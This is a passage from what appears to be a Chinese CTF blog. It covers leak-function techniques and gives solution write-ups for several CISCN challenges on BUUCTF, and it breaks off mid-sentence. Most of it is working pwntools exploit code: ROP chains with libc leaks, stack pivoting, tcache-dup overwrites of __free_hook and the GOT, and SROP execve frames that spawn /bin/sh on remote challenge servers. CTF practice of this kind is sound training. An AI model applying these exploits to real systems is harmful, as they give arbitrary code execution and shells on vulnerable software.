地址\n```\n\n★64位程序：利用万能gadget来赋予参数：\n\n```\n#注释头\n\ndef leak(addr):\n    #print p.recv()，看具体情况是否要先接收\n    payload = \"A\" * 24\n    payload += p64(pop6_addr) #万能gadget1\n    payload += p64(0)\n    payload += p64(1)\n    payload += p64(write_got_addr) #注意这里不能用plt表\n    payload += p64(8)\n    payload += p64(addr)\n    payload += p64(1)#write的参数fd，1代表stdout标准输出\n    payload += p64(mov_call_addr) #万能gadget2\n    payload += \"A\" * 56\n    #padding过掉万能gadget2的判断语句，接上万能gadget1，用来填充栈\n    payload += p64(startAddress)#跳转start，恢复栈\n    p.send(payload)\n    data = p.recv(4)\n    print (\"%#x => %s\" % (address, (data or '').encode('hex'))\n    return data\n```\n\n2.使用put函数：一个参数布局\n\nputs函数比较好调用，32位下直接在栈上布局就好，64位下用一个pop rdi就完事。\n\nputs的原型是puts(addr)，即将addr作为起始地址输出字符串，直到遇到“\\x00”字符为止。也就是说，puts函数输出的数据长度是不受控的，只要我们输出的信息中包含\\x00截断符，输出就会终止，且会自动将\"\\n\"追加到输出字符串的末尾，所以这里就需要针对leak函数做特殊处理。但结束不太好判断，如果只用\\n来判断，那么如果需要泄露的地址最后两个字节中的有效位中带有\\n(0x0a)，那同样会截断，导致无法完全输出。所以这里用\\n和timeout来判断，当结束字符\\n出现，并且设置超时机制，出现结束字符并且没有东西再输出了，那就代表是真的结束了。由于是一个字节一个字节处理，所以如果puts函数输出完后还有其它的输出，那么就没办法知道0x0a到底是put输出的还是之后的输出函数输出的，这里主要讨论在这两种情况：\n\n(这里也是因为TCP握手原因，TCP传输是以字节为单位进行编码传输的)\n\n★puts输出完后没有其它输出：\n\n```\n#注释头\n\ndef leak(address):\n    count = 0\n    data = ''\n    payload = xxx\n    p.send(payload)\n    print p.recvuntil('xxxn') #一定要在puts前释放完输出\n    up = \"\"\n    while True:\n    #由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待0.1秒钟，如果确实接收不到    了，就说明输出结束了\n    #这里为了不与标志字符串结束的回车符（0x0A）混淆，所以有两个判断条件。这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””\n        c = p.recv(numb=1, timeout=0.1)\n        count += 1\n        if up == '\\n' and c == \"\":  \n        #接收到的上一个字符为回车符，而当前接收不到新字符，则\n           buf = buf[:-1] #删除puts函数输出的末尾回车符\n           buf += \"x00\"\n           break\n        else:\n           buf += c\n           up = c\n    data = buf[:4]  #取指定字节数\n    log.info(\"%#x => %s\" % (address, (data or '').encode('hex')))\n    return data\n```\n\n★puts输出完后还有其它输出：\n\n```\n#注释头\n\ndef leak(address):\n    count = 0\n    data = ''\n    payload = xxx\n    p.send(payload)\n    print p.recvuntil('xxxn') #一定要在puts前释放完输出\n    up = \"\"\n    while True:\n    #由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待1秒钟，如果确实接收不到了，就说明输出结束了\n    #不与标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””\n    c = p.recv(numb=1, timeout=1)\n    count += 1\n    if up == 'n' and c == \"X\":  \n    #接收到的上一个字符为回车符，下一个字符开头是X，那就结束输出。\n        buf = buf[:-1]             #删除puts函数输出的末尾回车符\n        buf += \"x00\"\n        break\n    else:\n        buf += c\n        up = c\n    data = buf[:4]  #从put输出开头取指定字节数\n    log.info(\"%#x => %s\" % (address, (data or '').encode('hex')))\n    return data\n```\n\n▲使用printf函数：没找到具体点的，但应该和puts函数差不多，以后遇到再说。已知：\n\n遇到\\x00和\\x0a会截断，然后打印的时候不会打印\\x00和\\x0a\n\n \n\n三、重要注意事项：\n\n注意程序的输入函数是什么，有些题的输入函数是scanf，那么就不支持读入空格，换行符，制表符，转换成ascii码就是：0x20，0x0a，0x09，0x00,所以当传数据的时候有这些的时候需要注意。更多查资料或者调试。\n\n \n\n参考资料：\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\nhttps://www.anquanke.com/post/id/85129\n\n \n\n \n","tags":["pwn-knowledge"],"categories":["PWN"]},{"title":"CISCN-BUU刷题记录1","url":"/2021/08/14/CISCN-BUU刷题记录1/","content":"\n1.ciscn_2019_c_1：栈溢出，调用打印函数泄露地址，万能gadget，ROP。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./ciscn_2019_c_1\"\n#libc.so = \"./libc-2.24.so\"\n\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nrl = lambda :io.recvline()\nru = lambda s:p.recvuntil(s)\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n\n'''\n#malloc_hook,main_aren Find\npython2 LibcOffset.py libc-2.23.so\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"28337\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\nmenu = \"choice!\\n\"\npop_rdi=0x400c83\nret=0x4006b9\nmain=elf.sym['main']\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nencrypt_addr = 0x4009A0\n\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\nlog.info(\"u_gadget1:0x%x\"%u_gadget1)\nlog.info(\"u_gadget2:0x%x\"%u_gadget2)\n\npayload = \"\"\npayload += \"\\x00\"\npayload = payload.ljust(0x58,'A')\npayload += p64(u_gadget1) #使用万能gadgets调用puts泄露地址\npayload += p64(0x0)\npayload += p64(0x1) #rbp，随便设置\npayload += p64(puts_got)\npayload += p64(0x8)\npayload += p64(puts_got) #从该got表泄露地址\npayload += p64(puts_got)\npayload += p64(u_gadget2)\npayload += 'A'*0x38 #栈修正\npayload += p64(encrypt_addr)\n#返回到function处，通常返回程序最开始来重新运行程序好再进行布置\n\n#payload='\\0'+'a'*(0x50-1+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)\n\nru(menu)\nsl('1')\nsl(payload)\nru('Ciphertext\\n')\nru('\\n')\nputs_addr = u64(rc(6).ljust(8,'\\x00'))\nlog.info(\"puts:0x%x\"%u_gadget2)\n\nobj = LibcSearcher(\"puts\", puts_addr)\nlibc_base = puts_addr - obj.dump('puts')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\nlog.info(\"binsh_addr:0x%x\"%binsh_addr)\n\n\npayload='\\x00'+'a'*(0x50-1+8)+ p64(ret) + p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)\n\nsl(payload)\np.interactive()\n```\n\n2.ciscn_2019_es_2：32位栈溢出，溢出长度不够。泄露栈地址，用ebp将栈迁移到上层函数的栈中，利用上层函数余下的汇编代码实现常规的栈溢出操作system+binsh来getshell：\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./ciscn_2019_es_2\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n#libcsearcher use\n'''\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"28784\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\nsystem_plt = elf.plt['system']\n\nru(\"name?\\n\")\npayload1 = \"\"\npayload1 += \"A\"*(0x24)+\"B\"*0x4\np.send(payload1)\nru(\"BBBB\")\nstack_addr = u32(rc(4))\nebp_addr = stack_addr-0x10\nlog.info(\"ebp_addr:0x%x\"%ebp_addr)\n\npayload2 = p32(ebp_addr-0x28+0x8) #0\n#payload2 += p32(ebp_addr-0x40)\npayload2 += p32(system_plt) #4\npayload2 += p32(0x11111111) #padding\npayload2 += p32(ebp_addr-0x28 + 20) #8 binsh_addr\npayload2 += p32(ebp_addr) #12\npayload2 += \"/bin/sh\\x00\" #16\npayload2 = payload2.ljust(0x28,\"A\")\npayload2 += p32(ebp_addr-0x24) #old ebp\npause()\np.send(payload2)\n\n\np.interactive()\n```\n\n3.ciscn_2019_final_3：free之后指针未置空，且该2..27版的tcache存在dup漏洞。利用程序泄露堆地址，再利用dup控tcache结构体。修改一个Chunk的size域或者直接Free掉程序最开始自带的一个chunk，使其进入unsortedbin。然后在控tcache，再利用add函数泄露libc地址，改free_hook为system，free(binsh)一步getshell。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\n#from LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_final_3\"\nlibc_file= \"./libc.so.6\"\n#libc.so = \"\"\n\n#libcsearcher use\n'''\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    #p = process(binary)\n    p = process(binary, env={\"LD_PRELOAD\":\"./libc.so.6\"})\n    #elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"25451\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"choice > \"\n\n\ndef add(idx, size, context):\n    sla(menu, \"1\")\n    sla(\"input the index\\n\", str(idx))\n    sla(\"input the size\\n\", str(size))\n    sa(\"now you can write something\\n\", context)\n\ndef delete(idx):\n    sla(menu, \"2\")\n    sla(\"input the index\\n\", str(idx))\n\n# def show(idx):\n# sla(menu, \"3\")\n# sla(\"input index:\", str(idx))\n\n# def edit(idx, num, name, con):\n# sla(menu, \"4\")\n# sla(\"input index:\", str(idx))\n# sla(\"phone number:\", str(num))\n# sa(\"name:\", name)\n# sa(\"des info:\", con)\n\nbarray = 0x11c10\n\nadd(0,0x18,\"A\"*0x18)\n\nru(\"gift :\")\nchunk0_addr = int(rc(14)[2:14],16)-0x10\nheap_base = chunk0_addr - 0x11e60\nbarry_addr = heap_base+0x2d0\nlog.info(\"heap_base:0x%x\"%heap_base)\ndelete(0)\n\nadd(1,0x28,\"A\"*0x8) #1\ndelete(1) #tcache(0x78):1\ndelete(1) #tcache(0x78):1->1\n\nadd(2,0x28,p64(chunk0_addr-0x11c10+0x10)) #tcache(0x78):1->barry\nadd(3,0x28,\"A\") #tcache(0x78):barry\nadd(4,0x28,\"barry\")\ndelete(4)\n\n\nadd(5,0x78,\"B\"*0x8) #5\ndelete(5) #tcache(0x78):5\ndelete(5) #tcache(0x78):5->5\nadd(6,0x78,p64(heap_base+0x10)) #tcache(0x78):5->heap_base+0x10\nadd(7,0x78,\"B\"*0x8) #tcache(0x78):heap_base+0x10\n\nadd(8,0x78,\"\\x07\"+\"\\x00\"+\"\\x02\"+\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x03\"+ \"\\x00\"*0x39+\np64(0x0)+ #0x20\np64(0x0)+ #0x30\np64(barry_addr+0x10)+ #0x40\np64(0x0)+ #0x50\np64(0x0)+ #0x60\np64(0x0)+ #0x70\np64(heap_base+0x10)) #0x80\nadd(9,0x38,\"\\x78\")\npause()\nadd(10,0x38,\"\\xb0\")\nru(\"gift :\")\nlibc_base = int(rc(14)[2:14],16) - 0x3ebc40 - 88 -8\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nlog.info(\"libc_base:0x%x\"%libc_base)\nlog.info(\"free_hook:0x%x\"%free_hook)\n\nadd(11,0x78,\"\\x01\"+\"\\x00\"+\"\\x02\"+\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x03\"+ \"\\x00\"*0x39+\np64(free_hook)+ #0x20\np64(0x0)+ #0x30\np64(barry_addr+0x10)+ #0x40\np64(0x0)+ #0x50\np64(0x0)+ #0x60\np64(0x0)+ #0x70\np64(heap_base+0x10)) #0x80\npause()\nadd(12,0x18,p64(system_addr))\nadd(13,0x58,\"/bin/sh\\x00\")\npause()\ndelete(13)\npause()\np.interactive()\n```\n\n4.ciscn_2019_n_3：没啥漏洞，就是程序本身问题，str为结构体型chunk，int为正常chunk，且chunk中存在函数指针，可以通过一定堆布局修改函数指针，改成system再加bash即可getshell。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_2019_n_3\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n#libcsearcher use\n'''\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"25896\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"CNote > \"\n\n\ndef add(idx, Type, length, value):\nsla(menu, \"1\")\nsla(\"Index > \", str(idx))\nsla(\"Type > \", str(Type))\nif Type == 1:\nsla(\"Value > \", value)\nif Type == 2:\nsla(\"Length > \", str(length))\nsla(\"Value > \", value)\n\ndef delete(idx):\nsla(menu, \"2\")\nsla(\"Index > \", str(idx))\n\ndef show(idx):\nsla(menu, \"3\")\nsla(\"Index > \", str(idx))\n\n# def edit(idx, num, name, con):\n# sla(menu, \"4\")\n# sla(\"input index:\", str(idx))\n# sla(\"phone number:\", str(num))\n# sa(\"name:\", name)\n# sa(\"des info:\", con)\n\n#without stripped\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nmain_addr = elf.sym['main']\n\nadd(0,2,0x88,'A'*10)\nadd(1,2,0x38,'A'*10)\nadd(2,1,24,'1')\ndelete(1)\ndelete(2)\n\nadd(3,2,0xc,'dash'+ p32(system_plt))\nadd(4,2,0x38,'BBBB')\npause()\ndelete(1)\np.interactive()\npause()\n```\n\n5.ciscn_2019_n_5：栈溢出，泄露地址ROP。没开NX，shellcode也行。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./ciscn_2019_n_5\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n\n'''\n#malloc_hook,main_aren Find\npython2 LibcOffset.py libc-2.23.so\n'''\n\n\n'''\n#without stripped\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"26514\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\n\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nmain_addr = elf.sym['main']\n\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n\n#ret = 0x4004c9\n#pop_rdi_ret = 0x400713\n\npayload = \"\"\npayload += \"A\"*0x28\npayload += p64(pop_rdi_ret)\npayload += p64(puts_got)\npayload += p64(puts_plt)\npayload += p64(main_addr)\n\n\nru(\"name\\n\")\npause()\nsl(p64(0x0010000))\nru(\"me?\\n\")\nsl(payload)\nputs_addr = u64(rc(6).ljust(8,'\\x00'))\nlog.info(\"puts_addr:0x%x\"%puts_addr)\n#libcsearcher use\nobj = LibcSearcher(\"puts\", puts_addr)\nlibc_base = puts_addr-obj.dump('puts')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\nlog.info(\"binsh_addr:0x%x\"%binsh_addr)\n\npayload = \"\"\npayload += \"A\"*0x28\npayload += p64(ret)\npayload += p64(pop_rdi_ret)\npayload += p64(binsh_addr)\npayload += p64(system_addr)\npayload += p64(main_addr)\n\n\nru(\"name\\n\")\npause()\nsl(p64(0x0010000))\nru(\"me?\\n\")\nsl(payload)\np.interactive()\n```\n\n6.ciscn_s_3：栈溢出，利用SROP，栈迁移，常规getshell。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./ciscn_s_3\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n#libcsearcher use\n'''\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\nelf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"28198\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\nmain_addr = elf.sym['main']\ngadget_rax_0xf = 0x4004DA\nsyscall_addr = 0x400517\n\npayload1 = \"\"\npayload1 += \"A\"*0x10\npayload1 += p64(main_addr)\np.sendline(payload1)\nstack_addr = u64(rc(0x30)[32:40].ljust(8,'\\x00'))\nlog.info(\"stack_addr:0x%x\"%stack_addr)\n\nbinsh_addr = 0x601030\n\nframe_read = SigreturnFrame() #设置read的SROP帧\nframe_read.rax = constants.SYS_read\nframe_read.rdi = 0\nframe_read.rsi = binsh_addr\nframe_read.rdx = 0xf\nframe_read.rsp = stack_addr-280 + 0xf8\nframe_read.rip = syscall_addr\n\nlog.info(\"frame_read_addr:0x%x\"%(stack_addr-280))\n\n\nframe_execve = SigreturnFrame()\nframe_execve.rax = constants.SYS_execve\nframe_execve.rdi = binsh_addr\nframe_execve.rip = syscall_addr\n\npayload2 = \"\"\npayload2 += \"A\"*0x10\npayload2 += p64(gadget_rax_0xf)\npayload2 += p64(syscall_addr)\npayload2 += str(frame_read)\npayload2 += p64(syscall_addr)\npayload2 += str(frame_execve)\npause()\np.sendline(payload2)\npause()\np.sendline(\"/bin/sh\\x00\".ljust(0xf,'A'))\np.interactive()\n```\n\n▲需要注意的是：\n\nsyscall一般后面都有ret，所以在sigreturn_frame之后如果还需要调用其他的sigreturn_frame或者其他函数，都是需要在上一个sigreturn_frame中设置rsp，使得ret正常执行。\n\n①如果下一步还是sigreturn_frame，则将上一个的rsp设置为指向syscall_ret_addr的栈地址。\n\n②如果下一步是其他函数，则需设置对应指向函数地址的栈地址。\n\n(而以上的设置通常需要结合栈劫持来操作，数据可控比较方便，不用还得从原始栈上找对应的函数地址或者syscall_ret_addr)\n\n \n\n \n\n \n","tags":["刷题"],"categories":["PWN"]},{"title":"CISCN-BUU刷题记录3","url":"/2021/08/14/CISCN-BUU刷题记录3/","content":"\n1.ciscn_final_5：由于题目本身原因，chunkList中存放的堆地址是chunk_addr+idx，所以idx为16时就会导致存放的堆地址为chunk_addr+0x10。同时放入chunkList的顺序是按照申请顺序放入的，删除和修改的时候也是通过遍历查找的。那么如果先申请索引为16，1的chunk，chunkList中就会如下：\n\nchunk16_addr+0x10,chunk1_addr\n\n如果这时候释放索引为0的Chunk，就会误以为chunk16_addr+0x10为索引为0的chunk，如果事先伪造了chunk16_addr+0x10的size域，那么就能够将其释放，再申请回来，那么我们就能够制造堆块重叠，有了堆块重叠加上edit功能就很随意了。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\n#from LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_final_5\"\nlibc_file = \"./libc.so.6\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.26.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"28635\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"your choice: \"\n\n\ndef add(idx,size, con):\n    sla(menu, \"1\")\n    sla(\"index: \", str(idx))\n    sla(\"size: \", str(size))\n    sa(\"content: \", con)\n\ndef delete(idx):\n    sla(menu, \"2\")\n    sla(\"index: \", str(idx))\n\n\ndef edit(idx,con):\n    sla(menu, \"3\")\n    sla(\"index: \", str(idx))\n    sa(\"content: \", con)\n\n\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nfree_got = elf.got['free']\n__stack_chk_fail_got = elf.got['__stack_chk_fail']\n\nadd(16,0x10,p64(0x0)+p64(0x210))\nadd(1,0x10,p64(free_got))\nadd(2,0x20,p64(free_got))\nadd(3,0x30,p64(free_got))\nadd(4,0x40,p64(free_got))\n\ndelete(0)\ndelete(1)\ndelete(2)\ndelete(3)\ndelete(4)\n\nadd(5,0x200,p64(0x0)+p64(0x21)+p64(free_got))\nadd(6,0x10,\"Free\")\nadd(7,0x10,p64(puts_plt))\n\nedit(5,p64(0x0)+p64(0x21)+\np64(0x0)*0x3+p64(0x31)+\np64(__stack_chk_fail_got))\nadd(8,0x20,p64(__stack_chk_fail_got))\nadd(9,0x20,\"a\")\ndelete(9)\n\nlibc_base = u64(rc(6).ljust(8, '\\x00'))-libc.sym['puts']\nlog.info(\"libc_base:0x%x\"%libc_base)\nsystem_addr = libc_base + libc.sym['system']\n\nedit(5,p64(0x0)+p64(0x21)+p64(0x0)*10+p64(free_got))\nadd(10,0x30,p64(free_got))\nadd(11,0x30,p64(system_addr))\nadd(12,0x60,\"/bin/sh\\x00\")\ndelete(12)\np.interactive()\n```\n\n这里需要注意一点的是，我的做法不像其他人申请chunk到chunkList直接控制chunk块，从而修改堆块地址传入到被劫持为puts函数的free_got来泄露地址，而是直接申请到got表上，将got表作为堆地址传入被劫持为puts函数的free_got来泄露got表中的地址。\n\n但是这里会遇到一个问题，就是选择哪一个函数的got表作为堆地址。这里两种解决办法：\n\n(1)可以发送size为0，那么就不会修改到函数的got表，但是这个方法要求利用0x20的tcache的dup。\n\n(2)如果size不为0，那么申请堆块的时候势必要发送数据，最少也是\\x0a。那么发送数据也肯定会修改到该函数的真实地址，那么泄露出来的就是修改后的真实地址，而且如果该函数在程序运行过程中容易被调用，那么修改之后也势必会使得程序崩溃。这里有Libc文件还好，可以直接查找libc文件对于函数的最后一个字节来修复一下，但如果没有libc文件，那么就没招了。\n\n这里假设没有libc文件，那么我们就需要找一个不太能用到函数来修改，这里刚好有个__stack_chk_fail_，只要不触发canary，这个函数就不会被调用，其got表是延迟绑定的，保存的不是真实地址，直接拿来用就行。同时还要注意的是由于是__sta